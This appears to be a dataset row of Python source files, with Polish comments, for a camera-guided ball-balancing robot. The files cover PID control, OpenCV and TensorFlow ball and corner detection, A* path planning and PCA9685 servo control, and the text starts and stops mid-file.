                modeChangeTimer = 0.0
                angleRadiusFactor = 0.0
                movementMode += 1
                movementMode = movementMode % 4
            
            #dodawanie wpisow do DataLog'u
            if False:
                path_target = pathPlanner.getPathTarget()
                dataLogger.addRecord(""timestamp"", time.perf_counter())
                dataLogger.addRecord(""ball_pos_x"", ball_position_actual[0])
                dataLogger.addRecord(""ball_pos_y"", ball_position_actual[1])
                dataLogger.addRecord(""target_pos_x"", path_target[0])
                dataLogger.addRecord(""target_pos_y"", path_target[1])
                dataLogger.addRecord(""KP"", pidController.KP)
                dataLogger.addRecord(""KI"", pidController.KI)
                dataLogger.addRecord(""KD"", pidController.KD)
                dataLogger.addRecord(""error_x"", pidController.x_error)
                dataLogger.addRecord(""error_y"", pidController.y_error)
                dataLogger.addRecord(""error_prev_x"", pidController.x_prev_error)
                dataLogger.addRecord(""error_prev_y"", pidController.y_prev_error)
                dataLogger.addRecord(""error_sum_x"", pidController.x_error_sum)
                dataLogger.addRecord(""error_sum_y"", pidController.y_error_sum)
                dataLogger.addRecord(""derivative_x"", pidController.x_derivative)
                dataLogger.addRecord(""derivative_y"", pidController.y_derivative)
                dataLogger.addRecord(""servo_actual_x"", servoController.servo_actual_pos[0])
                dataLogger.addRecord(""servo_actual_y"", servoController.servo_actual_pos[1])
                dataLogger.addRecord(""servo_target_x"", servoController.servo_target_pos[0])
                dataLogger.addRecord(""servo_target_y"", servoController.servo_target_pos[1])
                dataLogger.saveRecord()
            
        #oczekiwanie na odpowiedni moment do aktualizacji serw
        if time.perf_counter() - servoUpdatedTime >= servoUpdateDeltaTime:
            servoController.update(time.perf_counter() - servoUpdatedTime)
            servoUpdatedTime = time.perf_counter()
            
            if simulationMode:
                simulationCommunicator.moveServos(servoController.servo_actual_pos)
                
        sleep(0.004) #4 milisekundy na odpoczynek :)
            
    print(""Stopping program"")
    #dataLogger.saveToFile(""BallanceDataLog"")
    if simulationMode: simulationCommunicator.StopProcessing()
    else: imageProcessor.StopProcessing()
    pathPlanner.stopProcessing()/n/n/n/PythonCode/ImageProcessingModule.py/n/nsimulationMode = False

if not simulationMode:
    import TensorflowProcessingModule as TPM
    from imutils.video.pivideostream import PiVideoStream

import MathModule as MM
import math, time, copy
import cv2
import numpy as np
from multiprocessing import Process, RawValue, RawArray
 
#program sluzacy do analizy obrazu z kamery, wykrywania kulki
class ImageProcessor:
    
    #parametry kamery
    camera_resolution = (256, 256)
    camera_framerate = 40
    
    corner_detecton_area = (0.08, 0.08, 0.14, 0.14) #prostakat, w ktorym szukana jest krawedz plyty, jest on powielany dla kazdego rogu obrazu
    detection_image_resolution = (200, 200)
    detection_image_resolution_cropped = (-1, -1)
    
    #rozmiar bitmapy przeszkod
    obstacle_map_size = 40
    obstacle_map_update_delta = 40
        
    def __init__(self, _simulationCommunicator=None):
        print(""ImageProcessor object created"")
        self.simulationCommunicator = _simulationCommunicator
        #wartosci-rezultaty przetwarzania obrazu
        self.result_x = RawValue('f', 0.0)
        self.result_y = RawValue('f', 0.0)
        self.key = RawValue('i', 0)
        
        self.obstacle_map = RawArray('i', ImageProcessor.obstacle_map_size**2)
        self.obstacle_map_update_counter = 0
        
    def getBallPosition(self):    #zwraca pozycje kulki
        if simulationMode: return self.simulationCommunicator.getBallPosition()
        return (self.result_x.value, self.result_y.value)
        
    def StartProcessing(self):   #uruchamia proces przetwarzajacy obraz
        print(""Starting image processing"")
        
        self.process = Process(target=ImageProcessor.ProcessImage, args=(self,))
        self.process.daemon = True
        self.process.start()
        #ImageProcessor.ProcessImage(self)
        
    def StopProcessing(self):    #wydaje polecenie do zatrzymania przetwarzania obrazu
        print(""Stopping image processing"")
        self.key.value = -666
        self.process.terminate()
        
    def ProcessImage(self):    #przetwarza obraz pobierajac klatke z kamery i wykonujac na niej operacje analizy
        
        #bufor dzielenia mapy przeszkod z innymi procesami
        self.obstacle_map_np = np.frombuffer(self.obstacle_map, dtype=np.int32).reshape(ImageProcessor.obstacle_map_size**2)
        
        #parametry trackera kulki
        self.ballTracker_pos = [ImageProcessor.detection_image_resolution[0]//2, ImageProcessor.detection_image_resolution[1]//2]
        self.ballTracker_size = 40
        self.ballTracker_result = [0, 0]
        
        if not simulationMode:
            self.tensorflowProcessor = TPM.TensorflowProcessor()
            videoStream = PiVideoStream(resolution=ImageProcessor.camera_resolution, framerate=ImageProcessor.camera_framerate).start()   #uruchamianie watku, ktory czyta kolejne klatki z kamery
        else:
            videoStream = self.simulationCommunicator
        
        time.sleep(1)
        self.frame_original = videoStream.read()
        
        lastTime = time.time()
        a = 190
        lastID = 0
        
        saveCounter = 0
        saveCount = 0
        
        while True:
            if self.key.value == -666: break
            
            #prosty licznik przetworzonych klatek w ciagu sekundy
            a = a + 1
            if a > 200:
                if ImageProcessor.detection_image_resolution_cropped[0] == -1:
                    ImageProcessor.detection_image_resolution_cropped = (np.size(self.frame_original, 0), np.size(self.frame_original, 1))
                print(str(a * 1.0 / (time.time() - lastTime)))
                lastTime = time.time()
                a = 0
            
            #synchronizacja pobierania nowej klatki z czestotliwascia kamery
            while True:
                frameGrabbed = videoStream.read()
                ID = id(frameGrabbed)
                if ID != lastID:
                    self.frame_original = frameGrabbed
                    lastID = ID
                    break
                elif not simulationMode:
                    time.sleep(0.01)
            
            #klatka przeznaczona do debugowania
            #self.frame_debug = copy.copy(self.frame_original)
            
            if not simulationMode: self.corners = ImageProcessor.FindBoardCorners(self)    #znajdowanie pozycji rogow plyty
            else: self.corners = self.simulationCommunicator.FindBoardCorners()
            ImageProcessor.ChangePerspective(self)    #zmiana perspektywy znalezionej tablicy, aby wygladala jak kwadrat
            #self.frame_original = self.frame_original[1:200, 1:200] #przycinanie zdjecia
            if not simulationMode: ImageProcessor.UpdateBallTracker(self)    #aktualizacja trackera kulki
            else:
                pos = self.simulationCommunicator.getBallPosition()
                self.ballTracker_result[0] = pos[0] * ImageProcessor.detection_image_resolution_cropped[0]
                self.ballTracker_result[1] = pos[1] * ImageProcessor.detection_image_resolution_cropped[1]
            ImageProcessor.UpdateObstacleMap(self)
            
            #ustawianie znalezionej pozycji kulki w zmiennych dzielonych miedzy procesami
            self.result_x.value = self.ballTracker_result[0] / ImageProcessor.detection_image_resolution_cropped[0]
            self.result_y.value = self.ballTracker_result[1] / ImageProcessor.detection_image_resolution_cropped[1]
            
            #cv2.imshow(""Frame debug"", self.frame_debug)
            if saveCounter < saveCount:
                cv2.imwrite(""Frame"" + str(saveCounter) + "".png"", self.frame_original)
                saveCounter += 1
                
            cv2.imshow(""Frame Casted"", self.frame_original)
            key = cv2.waitKey(1) & 0xFF
            #if key == ord(""q""):
            #    break
            
        videoStream.stop()
            
    #aktualizuje tracker kulki
    def UpdateBallTracker(self):
        self.ballTracker_pos[0] = MM.clamp(self.ballTracker_pos[0], 0, ImageProcessor.detection_image_resolution_cropped[0] - self.ballTracker_size)
        self.ballTracker_pos[1] = MM.clamp(self.ballTracker_pos[1], 0, ImageProcessor.detection_image_resolution_cropped[1] - self.ballTracker_size)
        
        self.ballTracker_pos[0] = int(self.ballTracker_pos[0])
        self.ballTracker_pos[1] = int(self.ballTracker_pos[1])
        
        #przygotowanie klatki z kamery do analizy
        tracker_frame = self.frame_original[self.ballTracker_pos[1]:self.ballTracker_pos[1]+self.ballTracker_size,
                                            self.ballTracker_pos[0]:self.ballTracker_pos[0]+self.ballTracker_size]
        tracker_frame = cv2.cvtColor(tracker_frame, cv2.COLOR_BGR2GRAY)
        
        #analiza klatki z uzyciem sieci neuronowych
        result = self.tensorflowProcessor.getBallPosition(tracker_frame)
        result = np.round(result * self.ballTracker_size).astype(""int"")
        
        self.ballTracker_result[0] = self.ballTracker_pos[0] + result[0]
        self.ballTracker_result[1] = self.ballTracker_pos[1] + result[1]
        
        #zaznaczanie wizualne pozycji kulki
        #cv2.circle(self.frame_original, tuple(self.ballTracker_result), 1, (0, 0, 255), -1)
        
        #aktualizacja pozycji trackera
        self.ballTracker_pos[0] = MM.lerp(self.ballTracker_pos[0], self.ballTracker_result[0] - self.ballTracker_size // 2, 0.7)
        self.ballTracker_pos[1] = MM.lerp(self.ballTracker_pos[1], self.ballTracker_result[1] - self.ballTracker_size // 2, 0.7)
    
    #znajduje pozycje krawedzi plyty
    def FindBoardCorners(self):
        corners = np.zeros((4, 2), dtype=np.int32)
        corner_detection_area_pixels = [round(self.corner_detecton_area[0] * self.camera_resolution[0]),
                                       round(self.corner_detecton_area[1] * self.camera_resolution[1]),
                                       round(self.corner_detecton_area[2] * self.camera_resolution[0]),
                                       round(self.corner_detecton_area[3] * self.camera_resolution[1])]
        for i in range(4):
            flipX = False
            flipY = False
            detectionArea = copy.copy(corner_detection_area_pixels)    #domyslnie lewy gorny
            if i == 1 or i == 2:
                detectionArea[0] = self.camera_resolution[0] - detectionArea[0] - detectionArea[2]
                flipX = True
            if i == 3 or i == 2:
                detectionArea[1] = self.camera_resolution[1] - detectionArea[1] - detectionArea[3]
                flipY = True
                
            rect = (detectionArea[0], detectionArea[1], detectionArea[0] + detectionArea[2], detectionArea[1] + detectionArea[3])
            #cv2.rectangle(self.frame_debug, (rect[0], rect[1]), (rect[2], rect[3]), (0, 255, 0), 1);
        
            img = self.frame_original[rect[1]:rect[3], rect[0]:rect[2]]
            img = cv2.cvtColor(img, cv2.COLOR_BGR2GRAY)
            img = cv2.resize(img, (40, 40), interpolation=cv2.INTER_NEAREST)
            
            if flipX and flipY: img = cv2.flip(img, -1)
            elif flipX: img = cv2.flip(img, 1)
            elif flipY: img = cv2.flip(img, 0)
            #cv2.imshow(""Corner "" + str(i), img)
            
            result = self.tensorflowProcessor.getCornerPosition(img)
            corner = np.round(result * 40.0).astype(""int"")
            
            if flipX and flipY: corners[i] = (40 - corner[0] + detectionArea[0], 40 - corner[1] + detectionArea[1])
            elif flipX: corners[i] = (40 - corner[0] + detectionArea[0], corner[1] + detectionArea[1])
            elif flipY: corners[i] = (corner[0] + detectionArea[0], 40 - corner[1] + detectionArea[1])
            else: corners[i] = (corner[0] + detectionArea[0], corner[1] + detectionArea[1])
            #cv2.circle(self.frame_debug, corners[i], 1, (0, 0, 255), 1)

        return corners

    #zmienia perspektywe obrazu z kamery tak, aby niewidoczne bylo przechylenie plyty
    def ChangePerspective(self):
        pts = np.array(self.corners, np.float32)
        res = self.detection_image_resolution
        pts2 = np.float32([[0,0],[res[0],0],[res[0], res[1]], [0, res[1]]])

        M = cv2.getPerspectiveTransform(pts, pts2)
        self.frame_original = cv2.warpPerspective(self.frame_original, M, res)
        
    #aktualizuje mape przeszkod na plycie
    def UpdateObstacleMap(self):
        self.obstacle_map_update_counter += 1
        if self.obstacle_map_update_counter >= ImageProcessor.obstacle_map_update_delta:
            self.obstacle_map_update_counter = 0
            frame = cv2.resize(self.frame_original, (ImageProcessor.obstacle_map_size, ImageProcessor.obstacle_map_size), interpolation=cv2.INTER_NEAREST)
            frame = np.int32(frame)
            frame = 2 * frame[...,2] - frame[...,1] - frame[...,0]
            np.copyto(self.obstacle_map_np, frame.ravel())
            #self.obstacle_map = frame[...,2].ravel()/n/n/n/PythonCode/PIDControllerModule.py/n/nimport MathModule as MM

class PIDController:
    
    #operacje zmiany pidow
    def increaseKP(self):
        self.KP += 50
        print(""KP = "" + str(self.KP))
        
    def increaseKI(self):
        self.KI += 50
        print(""KI = "" + str(self.KI))
        
    def increaseKD(self):
        self.KD += 50
        print(""KD = "" + str(self.KD))
        
    def decreaseKP(self):
        self.KP -= 50
        print(""KP = "" + str(self.KP))
        
    def decreaseKI(self):
        self.KI -= 50
        print(""KI = "" + str(self.KI))
        
    def decreaseKD(self):
        self.KD -= 50
        print(""KD = "" + str(self.KD))
        
    #ustawia aktualna wartosc
    def setActualValue(self, x, y=None):
        if y is not None:
            self.value_actual[0] = MM.lerp(self.value_actual[0], x, self.value_smoothing)
            self.value_actual[1] = MM.lerp(self.value_actual[1], y, self.value_smoothing)
        else:
            self.value_actual[0] = MM.lerp(self.value_actual[0], x[0], self.value_smoothing)
            self.value_actual[1] = MM.lerp(self.value_actual[1], x[1], self.value_smoothing)
        
    #ustawia docelowa wartosc
    def setTargetValue(self, x, y=None):
        if y is not None:
            self.value_target[0] = x
            self.value_target[1] = y
        else:
            self.value_target[0] = x[0]
            self.value_target[1] = x[1]
    
    def __init__(self):
        self.servo_pos_limit = (1000, 1000)    #ograniczenia wychylen serw (w skali od 0 do 1000)
        self.value_target = [0.5, 0.5]    #docelowa wartosc, ktora ma byc osiagnieta przez kontroler
        self.value_actual = [0.5, 0.5]    #aktualna wartosc
        self.value_smoothing = 0.7        #wspolczynnik wygladzania aktualizacji aktualnej wartosci

        #wspolczynniki kontroli
        self.KP = 1.5 * 1000   #wzmocnienie czesci proporcjonalnej
        self.KI = 7.0 * 1000    #wzmocnienie czesci calkujacej
        self.KD = 0.5 * 1000   #wzmocnienie czesci rozniczkujacej

        #pozycja serwa
        self.x_servo = 0.0
        self.y_servo = 0.0

        #wartosc bledu
        self.x_error = 0.0
        self.y_error = 0.0

        #wartosci poprzednich bledow
        self.x_prev_error = 0.0
        self.y_prev_error = 0.0

        #zmiana bledu w czasie
        self.x_derivative = 0.0
        self.y_derivative = 0.0

        #calkowita suma bledow
        self.x_error_sum = 0.0
        self.y_error_sum = 0.0

    #aktualizuje kontrolea PID
    def update(self, deltaTime):
        #liczenie bledu
        self.x_error = self.value_target[0] - self.value_actual[0]
        self.y_error = self.value_target[1] - self.value_actual[1]
        
        #print(""Error = ( "" + str(self.x_error) + ""; "" + str(self.y_error) + "")"")

        #liczenie pochodnej
        self.x_derivative = (self.x_error - self.x_prev_error) / deltaTime
        self.y_derivative = (self.y_error - self.y_prev_error) / deltaTime

        self.x_prev_error = self.x_error
        self.y_prev_error = self.y_error

        self.x_error_sum += self.x_error * deltaTime
        self.y_error_sum += self.y_error * deltaTime
        
        #zmiana pozycji serw z uwzglednieniem bledu biezacego, przyszlego oraz przeszlego
        self.x_servo = (self.x_error * self.KP) + (self.x_derivative * self.KD) + (self.x_error_sum * self.KI)
        self.y_servo = (self.y_error * self.KP) + (self.y_derivative * self.KD) + (self.y_error_sum * self.KI)
        
        self.x_servo = MM.clamp(self.x_servo, -self.servo_pos_limit[0], self.servo_pos_limit[0])
        self.y_servo = MM.clamp(self.y_servo, -self.servo_pos_limit[1], self.servo_pos_limit[1])
        
        self.x_error_sum = MM.clamp(self.x_error_sum, -1.0, 1.0) * 0.8
        self.y_error_sum = MM.clamp(self.y_error_sum, -1.0, 1.0) * 0.8/n/n/n/PythonCode/PathPlannerModule.py/n/nimport cv2
import numpy as np
import MathModule as MM
import time
from multiprocessing import Process, RawValue
from collections import deque
import copy

#program odpowiadajacy za planiwanie sciezki kulki
class PathPlanner:
    
    obstacle_map_size = 40    #rozmiar mapy przeszkod
    obstacle_map_update_delta = 4    #co ile sekund odswiezana ma byc mapa przeszkod?
    path_sub_update_delta = 0.3    #co ile sekund aktualizowac podsciezke?
    
    def __init__(self):
        print(""PathPlanner object created"")
        
        self.obstacle_map = None
        self.path = None
        self_path_last_index = 0
        self.proximity_map = np.zeros((PathPlanner.obstacle_map_size, PathPlanner.obstacle_map_size)) #tablica 2D z kosztem bliskosci wykrytych przeszkod
        
        self.ball_pos_x = RawValue('f', 0.5)
        self.ball_pos_y = RawValue('f', 0.5)
        self.target_pos_x = RawValue('f', 0.25)
        self.target_pos_y = RawValue('f', 0.25)
        self.path_x = RawValue('f', 0.5)
        self.path_y = RawValue('f', 0.5)
        
    def setBallPosition(self, pos):
        self.ball_pos_x.value = pos[1]
        self.ball_pos_y.value = pos[0]
        
    def setTargetPosition(self, pos):
        self.target_pos_x.value = pos[1]
        self.target_pos_y.value = pos[0]
        
    def getPathTarget(self):
        return (self.path_x.value, self.path_y.value)
        
    def startProcessing(self, _frame_array):
        print(""Starting PathPlanner process"")
        self.process = Process(target=PathPlanner.doPlanning, args=(self,_frame_array))
        self.process.daemon = True
        self.process.start()
        
    def stopProcessing(self):
        print(""Stopping PathPlanner process"")
        self.process.terminate()
        
    def doPlanning(self, _frame_array):
        obstacle_map_update_time = 0.0
        path_sub_update_time = 0.0
        while True:
            if time.perf_counter() - obstacle_map_update_time >= PathPlanner.obstacle_map_update_delta:
                obstacle_map_update_time = time.perf_counter()
                PathPlanner.updateObstacleMap(self, _frame_array)
                
            if time.perf_counter() - path_sub_update_time >= PathPlanner.path_sub_update_delta:
                path_sub_update_time = time.perf_counter()
                PathPlanner.UpdateSubPath(self)
        
    #aktualizuje bitmape przeszkod
    def updateObstacleMap(self, _frame_array):
        frame = np.frombuffer(_frame_array, dtype=np.int32)
        frame = np.clip(frame, 0, 255).astype('uint8').reshape((PathPlanner.obstacle_map_size, PathPlanner.obstacle_map_size))
        #cv2.imshow(""Map"", frame)
        frame = cv2.inRange(frame, 100, 255)
        #kernel = np.ones((2,2), np.uint8)
        #frame = cv2.dilate(frame, kernel, iterations=1)
        self.obstacle_map = frame
        
        #aktualizacja mapy bliskosci przeszkod
        self.proximity_map.fill(0)
        size = PathPlanner.obstacle_map_size - 1
        sides = ((1, 0), (1, -1), (0, -1), (-1, -1), (-1, 0), (-1, 1), (0, 1), (1, 1))
        for x in range(1, size):
            for y in range(1, size):
                if frame[x, y] > 0:
                    for side in sides:
                        self.proximity_map[x + side[0], y + side[1]] += 1
        
        #np.clip(self.proximity_map, 0, 1, self.proximity_map)
        self.proximity_map *= 0#5000
        
        #aktualizacja glownej sciezki
        start = (round(self.ball_pos_x.value * PathPlanner.obstacle_map_size), round(self.ball_pos_y.value * PathPlanner.obstacle_map_size))
        end = (round(self.target_pos_x.value * PathPlanner.obstacle_map_size), round(self.target_pos_y.value * PathPlanner.obstacle_map_size))
        self.path = PathPlanner.a_star(self, start, end)
        self.path_last_index = len(self.path)-1
        
    #aktualizuje podsciezke przy uzyciu algorytmu A*
    def UpdateSubPath(self):
        if self.path == None: return None
        
        ball_pos = (self.ball_pos_x.value, self.ball_pos_y.value)
        path = self.path
        start = (round(ball_pos[0] * PathPlanner.obstacle_map_size), round(ball_pos[1] * PathPlanner.obstacle_map_size))
        end = path[self.path_last_index]
        
        #wyszukiwanie binarne najdlaszego punktu na sciezce, do ktorego da sie dojsc w linii prostej
        x = 0
        y = self.path_last_index
        center = 0
        index = 0
        while x <= y:
            center = (x + y) // 2
            if not PathPlanner.Raycast(self, start, path[center]):
                index = center
                x = center + 1
            else: y = center - 1
        
        end = (end[0] / PathPlanner.obstacle_map_size, end[1] / PathPlanner.obstacle_map_size)
        dist = 0.13 * MM.clamp(4 * MM.magnitude(ball_pos[0] - end[0], ball_pos[1] - end[1]), 0.4, 1)
        #print(str(MM.magnitude(ball_pos[0] - self.target_pos_x.value, ball_pos[1] - self.target_pos_y.value)))
        
        vec2go = MM.normalized(path[index][0] - start[0], path[index][1]- start[1])    #wektor docelowego ruchu kulki
        mag = MM.magnitude(0.5 - ball_pos[0], 0.5 - ball_pos[1])    #odleglosc kulki od srodka plyty
        vec2center = ((0.5 - ball_pos[0]) / mag, (0.5 - ball_pos[1]) / mag)    #wektor z pozycji kulki do srodka plyty
        edgeReluctance = 0.012 / (0.6 - min(mag, 0.5))
        print(edgeReluctance)
        
        self.path_x.value = vec2go[1] * dist + ball_pos[1] + vec2center[1] * edgeReluctance
        self.path_y.value = vec2go[0] * dist + ball_pos[0] + vec2center[0] * edgeReluctance
            
        frame = copy.copy(self.obstacle_map)
        #frame = np.uint8(frame)
        frame = cv2.cvtColor(frame, cv2.COLOR_GRAY2BGR)
        
        #DEBUG
        #for p in path:
        #    if PathPlanner.isPointWithinMap(self, p):
        #        frame[p[0], p[1]] = [255, 255, 0]
            
        PathPlanner.PaintRay(self, start, path[index], frame)
        frame = cv2.resize(frame, (200, 200), interpolation=cv2.INTER_NEAREST)
        
        cv2.imshow(""PathPlanner frame"", frame)
        key = cv2.waitKey(1) & 0xFF
        
    #sprawdza, czy punkt wewnatrz mapy przeszkod
    def isPointWithinMap(self, point):
        size = self.obstacle_map_size
        return point[0] >= 0 and point[0] < size and point[1] >= 0 and point[1] < size
        
    #algorytm A* wyznaczajacy sciezke z punktu A do B
    def a_star(self, A, B):
        start = B
        end = A
        movement = ((1, 0), (-1, 0), (0, 1), (0, -1))
        #movement = ((1, 0), (-1, 0), (0, 1), (0, -1), (-1, -1), (-1, 1), (1, 1), (1, -1))
        
        que = MM.PriorityQueue()
        que.push(start, 0)
        
        visited_from = {}
        cost = {}
        
        visited_from[start] = None
        visited_from[end] = None
        cost[start] = 0
        
        #timeStart = time.perf_counter()
        while not que.empty():
            v = que.pop()
            if v == end: break
            
            new_cost = cost[v] + 1
            for move in movement:
                nx = v[0] + move[0]
                ny = v[1] + move[1]
                
                if PathPlanner.isPointWithinMap(self, (nx, ny)) and self.obstacle_map[nx, ny] == 0:
                    u = (nx, ny)
                    if u not in cost or new_cost < cost[u]:
                        cost[u] = new_cost
                        center = PathPlanner.obstacle_map_size // 2
                        que.push(u, new_cost + MM.sqrMagnitude(v[0] - u[0], v[1] - u[1]) + self.proximity_map[u[0], u[1]] + int(MM.sqrMagnitude(center - u[0], center - u[1])))
                        visited_from[u] = v
        
        path = []
        if visited_from[end] != None:
            v = end
            while v != start:
                path.append(v)
                v = visited_from[v]
            path.append(start)
        else:
            time.sleep(0.05)
            path.append(end)
        
        return path
    
    #sprawdza, czy promien przecina pole, na ktorym znajduje sie przeszkoda
    def Raycast(self, origin, end):
        obstacle_map = self.obstacle_map
        if not PathPlanner.isPointWithinMap(self, origin) or not PathPlanner.isPointWithinMap(self, end): return False    #jesli punkt startowy jest poza mapa
        if origin == end: return obstacle_map[origin[0], origin[1]]    #jesli promien jest punktem
        
        vec = (end[0] - origin[0], end[1] - origin[1])
        flipped = False    #czy wspolrzedne w ukladzie sa zamienione miejscami? (x; y) -> (y; x)
        if abs(vec[1]) > abs(vec[0]):
            #jesli nachylenie wektora jest wieksze niz 45 stopni
            #uklad wspolrzednych 'obracany jest' o 90 stopni
            vec = (vec[1], vec[0])
            origin = (origin[1], origin[0])
            end = (end[1], end[0])
            flipped = True
        
        dir = vec[1]/vec[0] #wspolczynnik kierunkowy promienia
        offset = origin[1] - dir * origin[0]    #skladnik 'b' w funkcji y = dir*x + b; przechodzi ona przez 'origin'
        
        #znaleznienie najbardziej lewego i prawego punktu promienia
        if origin[0] >= end[0]:
            left = end[0]
            right = origin[0]
        else:
            left = origin[0]
            right = end[0]
            
        #przejscie po wszystkich punktach mapy przeszkod nalezacych do promienia i sprawdzenie, czy ktorys z nich jest przeszkada
        if not flipped:
            for x in range(left, right+1):
                y = round(dir * x + offset)
                #print(""Checked ("" + str(x) + "", "" + str(y) + "")"") 
                if obstacle_map[x, y] > 0:
                    return True
        else:
            for x in range(left, right+1):
                y = round(dir * x + offset)
                #print(""Checked ("" + str(y) + "", "" + str(x) + "")"") 
                if obstacle_map[y, x] > 0:
                    return True
                
        return False
    
    #DEBUG
    def PaintRay(self, origin, end, frame):
        obstacle_map = self.obstacle_map
        if not PathPlanner.isPointWithinMap(self, origin) or not PathPlanner.isPointWithinMap(self, end): return    #jesli punkt startowy jest poza mapa
        if origin == end:
            frame[origin[0], origin[1]] = [0, 255, 0]
            return
            
        
        vec = (end[0] - origin[0], end[1] - origin[1])
        flipped = False    #czy wspolrzedne w ukladzie sa zamienione miejscami? (x; y) -> (y; x)
        if abs(vec[1]) > abs(vec[0]):
            #jesli nachylenie wektora jest wieksze niz 45 stopni
            #uklad wspolrzednych 'obracany jest' o 90 stopni
            vec = (vec[1], vec[0])
            origin = (origin[1], origin[0])
            end = (end[1], end[0])
            flipped = True
        
        dir = vec[1]/vec[0] #wspolczynnik kierunkowy promienia
        offset = origin[1] - dir * origin[0]    #skladnik 'b' w funkcji y = dir*x + b; przechodzi ona przez 'origin'
        
        #znaleznienie najbardziej lewego i prawego punktu promienia
        if origin[0] >= end[0]:
            left = end[0]
            right = origin[0]
        else:
            left = origin[0]
            right = end[0]
            
        #przejscie po wszystkich punktach mapy przeszkod nalezacych do promienia i sprawdzenie, czy ktorys z nich jest przeszkada
        if not flipped:
            for x in range(left, right+1):
                y = round(dir * x + offset)
                frame[x, y] = [0, 255, 0]
        else:
            for x in range(left, right+1):
                y = round(dir * x + offset)
                frame[y, x] = [0, 255, 0]/n/n/n/PythonCode/ServoControllerModule.py/n/nfrom __future__ import division
simulationMode = False

if not simulationMode:
    import sys
    sys.path.append('/home/pi/Adafruit_Python_PCA9685/')
    import Adafruit_PCA9685
    
import math
import MathModule as MM

#program kontrolujacy ruch serw
class ServoController:
    
    #parametry serw
    servo_pulse_neutral = (388, 379)    #wartosci pwm dla pozycji neutralnych serw
    servo_pulse_range = (100, 100)      #zakres wartosci sygnalu pwm dla ruchu serw
    servo_pos_limit = (800, 800)    #ograniczenia wychylen serw (w skali od 0 do 1000)
    servo_movement_speed = (6000, 6000)    #szybkosci ruchu serw
    
    def __init__(self):
        if not simulationMode:
            self.pwm = Adafruit_PCA9685.PCA9685()  #laczenie sie z plytka sterujaca serwami
            self.pwm.set_pwm_freq(60)
        
        #zmienne wartosci
        self.servo_actual_pos = [0, 0]    #aktualna pozycja serwa
        self.servo_target_pos = [0, 0]    #docelowa pozycja serwa
        
        self.update(0)   #aplikowanie domyslnych ustawien serw

    #wydaje polecenie poruszenia serwem na kanale 'channel' na pozycje 'pos' (w skali od -1000 do 1000)
    def moveServo(self, channel, pos):
        self.servo_target_pos[channel] = MM.clamp(pos, -ServoController.servo_pos_limit[channel], ServoController.servo_pos_limit[channel])

    #aktualizuje pozycje serw
    def update(self, deltaTime):
        for i in range(2): #tylko 2 serwa
            
            movement_dir = MM.sign(self.servo_target_pos[i] - self.servo_actual_pos[i])
            self.servo_actual_pos[i] += ServoController.servo_movement_speed[i] * movement_dir * deltaTime
            
            if movement_dir > 0: self.servo_actual_pos[i] = min(self.servo_actual_pos[i], self.servo_target_pos[i])
            elif movement_dir < 0: self.servo_actual_pos[i] = max(self.servo_actual_pos[i], self.servo_target_pos[i])
                
            if not simulationMode:
                pos = round(ServoController.servo_pulse_neutral[i] + ServoController.servo_pulse_range[i] * self.servo_actual_pos[i] / 1000)
                self.pwm.set_pwm(i, 0, pos)
            else:
                self.servo_actual_pos[i] = round(self.servo_actual_pos[i])
/n/n/n",1
142,da22d46baf8362ce33dd89c8d5ac834632fc4e0f,"PythonCode/Ballance.py/n/nif __name__ == '__main__':
    simulationMode = False    #czy uruchomic program w trybie symulacji? wymaga rowniez zmiany w ServoControllerModule.py oraz w ImageProcessingModule.py

    import ImageProcessingModule as IPM
    import ServoControllerModule as SCM
    import PIDControllerModule as PIDCM
    import DataLoggerModule as DLM
    import PathPlannerModule as PPM
    
    from time import sleep
    import time
    import pygame
    import math
    import MathModule as MM

    #wykonanie wstepnych czynnosci
    if simulationMode:
        import SimulationCommunicatorModule as SimCM
        simulationCommunicator = SimCM.SimulationCommunicator()
    else: simulationCommunicator = None
    
    imageProcessor = IPM.ImageProcessor(simulationCommunicator)
    servoController = SCM.ServoController()
    pathPlanner = PPM.PathPlanner()
        
    dataLogger = DLM.DataLogger()
    pidController = PIDCM.PIDController()
    pidController.servo_pos_limit = servoController.servo_pos_limit

    pygame.init()
    pygame.display.set_mode((100, 100))

    #roizpoczynanie procesu wykrywania kulki
    if simulationMode: simulationCommunicator.StartProcessing()
    imageProcessor.StartProcessing()
    pathPlanner.startProcessing(imageProcessor.obstacle_map)

    targetDeltaTime = 1.0 / 40.0    #czas jednej iteracji programu sterujacego
    updatedTime = 0.0
    servoUpdateDeltaTime = 1.0 / 60 #czas odswiezania pozycji serw
    servoUpdatedTime = 0.0

    ball_position_actual = (0.0, 0.0)
    ball_position_previous = (0.0, 0.0)

    #parametry trajektorii kulki
    angle = 0.0
    angleSpeed = 0.9
    angleRadius = 0.25
    angleRadiusFactor = 0.0
    path_targets = [(0.18, 0.18), (0.82, 0.82)]
    path_target_index = 0
    targetPos = path_targets[path_target_index]
    moveSpeed = 0.05
    movementMode = 0
    modeChangeTimeDelta = 25 #czas po jakim zmieniana jest trajektoria kulki
    modeChangeTimer = 0.0

    #jak dlugo wykonywany ma byc program
    duration = 10000
    timeout = time.time() + duration
    ball_just_found = True    #czy kulka dopiero zostala znaleziona i nalezy zresetowac predkosc?

    #glowna petla programu
    while time.time() <= timeout:
        timeStart = time.perf_counter()
        
        #oczekiwanie na odpowiedni moment do wykonania programu sterujacego
        if timeStart - updatedTime >= targetDeltaTime:
            updatedTime = time.perf_counter()
            
            #pobranie pozycji kulki
            ball_position_actual = imageProcessor.getBallPosition()
            if ball_position_actual[0] >= 0: pidController.setActualValue(ball_position_actual)
            else: pidController.setActualValue(pidController.value_target)
                
            #aktualizacja kontrolera PID
            pidController.update(targetDeltaTime)
            ball_position_previous = ball_position_actual
            
            #aktualizacja pozycji kulki w pathplannerze
            pathPlanner.setBallPosition(ball_position_actual)
            pidController.setTargetValue(pathPlanner.getPathTarget())
            
            #przechodzenie do kolejnego waypoint'a
            if MM.sqrMagnitude(ball_position_actual[0] - targetPos[0], ball_position_actual[1] - targetPos[1]) < 0.01:
                path_target_index = (path_target_index + 1) % len(path_targets)
                targetPos = path_targets[path_target_index]
                pathPlanner.setTargetPosition(targetPos)
            #print(str(pidController.value_target))
            
            #obslugiwanie wejscia z klawiatury
            killLoop = False
            for event in pygame.event.get():
                if event.type == pygame.KEYDOWN:
                    if event.key == pygame.K_g:
                        pidController.increaseKP()
                        
                    elif event.key == pygame.K_b:
                        pidController.decreaseKP()
                        
                    elif event.key == pygame.K_h:
                        pidController.increaseKI()
                        
                    elif event.key == pygame.K_n:
                        pidController.decreaseKI()
                        
                    elif event.key == pygame.K_j:
                        pidController.increaseKD()
                        
                    elif event.key == pygame.K_m:
                        pidController.decreaseKD()
                        
